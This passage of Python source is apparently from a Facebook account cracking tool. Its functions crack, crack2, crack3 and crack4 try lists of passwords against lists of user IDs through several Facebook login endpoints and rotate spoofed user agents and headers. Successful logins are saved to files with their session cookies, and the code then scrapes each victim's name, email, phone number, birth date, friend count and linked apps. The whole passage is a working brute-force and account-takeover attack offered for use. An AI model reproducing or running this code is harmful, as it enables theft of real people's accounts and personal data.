					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print(f"""\r{P}[•]------>{I}Sukses
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] User id  : {I}{idf}
{P}[•] Password : {U}{pw}
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] Cookie   : {b}{kuki}\n""")
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
					if 'Yess' in taplikasi:
						ok+=1
						coki=po.cookies.get_dict()
						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
						open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
						print(f"""\r{P}[•]------>{I}Sukses
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] User id  : {I}{idf}
{P}[•] Password : {U}{pw}
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] Cookie   : {b}{kuki}\n""")
						cek_apk(kuki)
						break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					#print('\n')
					print(f'\r{h}{idf} • {pw} • {kuki}\n{infoakun}')
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([U,P,B,b,I,K,M])
	dom = random.choice([U,P,B,b,I,K,M])
	emot = random.choice(["😁", "😂", "😇", "😂", "😎", "😝", "😜", "😞", "😟", "😠", "😡", "😤", "😪", "😭", "🤓", "🙃", "😊", "😍", "😵", "🤕", "😴"])
	pers = loop*100/len(id2)
	fff = '%'
#	sys.stdout.write('\r %s%s/%s OK:%s CP:%s'%(x,loop,len(id2),ok,cp));sys.stdout.flush()
	sys.stdout.write(f"\r {emot} {bi}+++++++> {dom} {loop}/{len(id2)}  {I}OK {P}: {b}{ok} {K}CP : {b}{cp}");sys.stdout.flush()
#	emot = random.choice(["😁","😂","😊","😇","😉","😌","😍","😘","😝","🤑","😗","😃","😄","😙","😉","☺","😅","😆","😗","😠","😣","😱"])
	emot = random.choice(["😁", "😂", "😇", "😂", "😎", "😝", "😜", "😞", "😟", "😠", "😡", "😤", "😪", "😭", "🤓", "🙃", "😊", "😍", "😵", "🤕", "😴"])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f"""\r{P}[•]------>{K}Chekpoints
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] User id  : {K}{idf}
{P}[•] Password : {U}{pw}
{B} |
{P}[•]{B}-------------------------------------->\n""")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					#print('\n')
					print(f"""\r{P}[•]------>{I}Sukses
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] User id  : {I}{idf}
{P}[•] Password : {U}{pw}
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] Cookie   : {b}{kuki}\n""")
#					loger()
#					print(f'\r{h}_ {idf} • {pw}')
#					print(f'\r{h} |_Cookie : {kuki}')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

		#			infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")
					infoakun += (f"""
   {P}NAMA         : {U}{nama}
   {P}JUMLAH TEMAN : {U}{teman} 
   {P}PASSWORD     : {I}{pw} 
								""")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					#print('\n')
					print(f'\r{h}{idf} • {pw} • {kuki}\n{infoakun}')
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


# CRACKER2
def crack2(idf,pwv):
	global loop,ok,cp
#	bi = random.choice([u,k,kk,b,h,hh])
	bi = random.choice([U,P,B,b,I,K,M])
	dom = random.choice([U,P,B,b,I,K,M])
#	emot = random.choice(["😁","😂","😊","😇","😉","😌","😍","😘","😝","🤑","😗","😃","😄","😙","😉","☺","😅","😆","😗","😠","😣","😱"])
	emot = random.choice(["✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓", "✓"])
#	sys.stdout.write(f"\r {emot} {bi}+++++++> {dom} {loop}/{len(id2)}  {I}OK {P}: {b}{ok} {K}CP : {b}{cp}");sys.stdout.flush()
	pers = loop*100/len(id2)
	fff = '%'
	#sys.stdout.write('\r %s%s/%s OK:%s CP:%s'%(x,loop,len(id2),ok,cp));sys.stdout.flush()
	sys.stdout.write(f"\r {emot} {bi}Baloch > {dom} {loop}/{len(id2)}  {I}OK {P}: {b}{ok} {K}CP : {b}{cp}");sys.stdout.flush()
	ua = random.choice(ugen).replace('\n','')
	ses = requests.Session()
	for pw in pwv:
		try:
			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f"\r{K} {idf} • {pw}")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAA" in resp.text:
				print(f"\r{I} {idf} • {pw} • {U}{kuki}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
#				loger()
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#Crack3
def crack3(idf,pwv):
	global loop,ok,cp
	bi = random.choice([U,P,B,b,I,K,M])
	dom = random.choice([U,P,B,b,I,K,M])
	emot = random.choice(["😁", "😂", "😇", "😂", "😎", "😝", "😜", "😞", "😟", "😠", "😡", "😤", "😪", "😭", "🤓", "🙃", "😊", "😍", "😵", "🤕", "😴"])
#	emot = random.choice(["😁","😂","😊","😇","😉","😌","😍","😘","😝","🤑","😗","😃","😄","😙","😉","☺","😅","😆","😗","😠","😣","😱"])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s%s/%s OK:%s CP:%s'%(x,loop,len(id2),ok,cp));sys.stdout.flush()
	sys.stdout.write(f"\r {emot} {bi}+++++++> {dom} {loop}/{len(id2)}  {I}OK {P}: {b}{ok} {K}CP : {b}{cp}");sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'free.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://free.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://free.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f"\r{K} {idf} • {pw}")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print(f"\r{I} {idf} • {pw} • {U}{kuki}")
#					loger()
					break
				elif 'ya'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=active",cookies=coki).text
					cek2 = session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=inactive",cookies=coki).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print(f'\r{h}{idf} • {pw} • {kuki}\n{infoakun}')
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#CRACKER4
def crack4(idf,pwv):
	global loop,ok,cp
#	bi = random.choice([u,k,kk,b,h,hh])
	bi = random.choice([U,P,B,b,I,K,M])
	dom = random.choice([U,P,B,b,I,K,M])
	emot = random.choice(["😁", "😂", "😇", "😂", "😎", "😝", "😜", "😞", "😟", "😠", "😡", "😤", "😪", "😭", "🤓", "🙃", "😊", "😍", "😵", "🤕", "😴"])
#	emot = random.choice(["😁","😂","😊","😇","😉","😌","😍","😘","😝","🤑","😗","😃","😄","😙","😉","☺","😅","😆","😗","😠","😣","😱"])
	pers = loop*100/len(id2)
	fff = '%'
	#sys.stdout.write('\r %s%s/%s OK:%s CP:%s'%(x,loop,len(id2),ok,cp));sys.stdout.flush()
	sys.stdout.write(f"\r {emot} {bi}+++++++> {dom} {loop}/{len(id2)}  {I}OK {P}: {b}{ok} {K}CP : {b}{cp}");sys.stdout.flush()
	for pw in pwv:
		try:
			pw = pw.lower()
			session = requests.Session()
			asu=random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400,Mozilla/5.0 (Linux; Android 5.1; en-US; E5533 Build/29.1.B.0.101) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Noki630/1.0 SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36','NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/70/352','NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0(Java; U; MIDP-2.0; en-us; nokiax2-02) U2/1.0.0 UCBrowser/8.7.1.234 U2/1.0.0 Mobile UNTRUSTED/1.0','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; vivo Y53 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/8.6.12.9','Mozilla/5.0 (Linux; Android 8.1; DUA-L22 Build/HONORDUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G610Y Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; vi; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.0; en-US; ASUS_Z00AD Build/LRX21V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/264.0.0.44.111;]','Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/327.0.0.33.120;]','Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-gc','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 730 Dual SIM) AppleWebKit/537.36 (KHTML, seperti 